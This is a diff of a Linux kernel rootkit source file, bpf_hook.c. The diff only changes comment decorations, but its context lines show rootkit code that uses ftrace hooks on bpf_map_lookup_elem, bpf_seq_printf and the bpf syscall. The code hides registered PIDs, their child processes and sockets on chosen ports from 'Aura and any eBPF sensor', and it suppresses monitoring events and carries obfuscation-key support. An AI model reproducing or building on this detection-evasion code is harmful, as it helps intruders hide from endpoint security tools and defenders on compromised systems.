@@ -1,4 +1,4 @@
-/* bpf_hook.c — Intercepts all eBPF userspace communication primitives.
+/* bpf_hook.c   Intercepts all eBPF userspace communication primitives.
  * PIDs registered via sysfs become invisible to Aura and any eBPF sensor.
  *
  * Ported from Singularity bpf_hook.c with:
@@ -15,7 +15,7 @@
 
 #define PID_MAX_VALUE   4194304U
 
-/* ── Event format detection structures ──────────────────────── */
+/*  Event format detection structures                        */
 
 struct bpf_iter_ctx_generic { struct bpf_iter_meta *meta; void *obj; };
 struct bpf_iter_ctx_tcp  { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; };
@@ -62,7 +62,7 @@ struct mon_event {
 
 #define EXT_HDR_MIN (sizeof(struct ebpf_evt_ctx))
 
-/* ── Obfuscation key support ─────────────────────────────────── */
+/*  Obfuscation key support                                   */
 
 static atomic64_t ebpf_obf_key = ATOMIC64_INIT(0);
 
@@ -89,7 +89,7 @@ static notrace inline u64 read_obf_key_va(void)
     return READ_ONCE(*(u64 *)va);
 }
 
-/* ── PID check helpers ──────────────────────────────────────── */
+/*  PID check helpers                                        */
 
 static notrace inline bool should_hide_any_pid_by_int(int pid)
 {
@@ -119,7 +119,7 @@ static notrace bool is_child_of_hidden_process(int pid)
     return is_hidden_pid(pid) || is_child_pid(pid);
 }
 
-/* ── Event heuristics ────────────────────────────────────────── */
+/*  Event heuristics                                          */
 
 static notrace inline bool is_procinfo_event(const void *data)
 {
@@ -200,7 +200,7 @@ static notrace inline bool should_suppress_procinfo(const void *data, u64 size)
            should_hide_any_pid_by_int((int)real_tgid);
 }
 
-/* ── Socket hiding (uses bat_hidden_port from sysfs) ────────── */
+/*  Socket hiding (uses bat_hidden_port from sysfs)          */
 
 static notrace bool should_hide_socket_port(struct sock_common *sk)
 {
@@ -221,7 +221,7 @@ static notrace bool should_hide_socket_port(struct sock_common *sk)
     return false;
 }
 
-/* ── task_struct safety check ────────────────────────────────── */
+/*  task_struct safety check                                  */
 
 static notrace inline bool is_valid_task_ptr_safe(const struct task_struct *task)
 {
@@ -313,7 +313,7 @@ static notrace bool should_suppress_mon_event(const void *data, u64 size)
     return false;
 }
 
-/* ── ringbuf_discard helper ──────────────────────────────────── */
+/*  ringbuf_discard helper                                    */
 
 typedef void (*t_rb_discard)(void *, u64);
 static t_rb_discard fn_rb_discard = NULL;
@@ -323,7 +323,7 @@ static notrace inline void safe_discard(void *data, u64 flags)
     if (fn_rb_discard) fn_rb_discard(data, flags);
 }
 
-/* ── Config map scanner ──────────────────────────────────────── */
+/*  Config map scanner                                        */
 
 typedef struct bpf_map *(*t_map_next)(u32 *id);
 typedef void            (*t_map_put)(struct bpf_map *map);
@@ -353,7 +353,7 @@ static notrace void find_config_map_va(void)
     }
 }
 
-/* ── Hooks ───────────────────────────────────────────────────── */
+/*  Hooks                                                     */
 
 static void *(*orig_bpf_map_lookup_elem)(struct bpf_map *map, const void *key) = NULL;
 
@@ -676,7 +676,7 @@ passthrough:
     return orig_bpf_seq_printf(m, fmt, fmt_size, data, data_len);
 }
 
-/* sys_bpf hook — x86_64 or ARM64, no ia32 on ARM64 */
+/* sys_bpf hook   x86_64 or ARM64, no ia32 on ARM64 */
 static asmlinkage long (*orig_bpf)(const struct pt_regs *regs);
 
 static notrace asmlinkage long hook_bpf(const struct pt_regs *regs)
@@ -685,7 +685,7 @@ static notrace asmlinkage long hook_bpf(const struct pt_regs *regs)
     return orig_bpf(regs);
 }
 
-/* ── Hook table ──────────────────────────────────────────────── */
+/*  Hook table                                                */
 
 static struct ftrace_hook hooks[] = {
     HOOK("bpf_map_lookup_elem",       hook_bpf_map_lookup_elem,       &orig_bpf_map_lookup_elem),
@@ -703,7 +703,7 @@ static struct ftrace_hook hooks[] = {
     HOOK(ARCH_SYS("bpf"),             hook_bpf,                       &orig_bpf),
 };
 
-/* ── Init / Exit ─────────────────────────────────────────────── */
+/*  Init / Exit                                               */
 
 notrace int bpf_hook_init(void)
 {
